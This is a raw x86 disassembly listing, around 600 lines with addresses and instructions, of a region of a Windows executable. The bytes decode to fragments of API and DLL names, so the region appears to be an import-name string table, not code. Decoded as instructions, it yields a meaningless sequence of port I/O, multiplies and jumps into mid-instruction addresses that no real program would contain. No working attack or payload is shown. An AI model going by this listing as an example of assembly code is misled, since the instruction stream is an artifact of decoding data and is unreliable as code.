  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
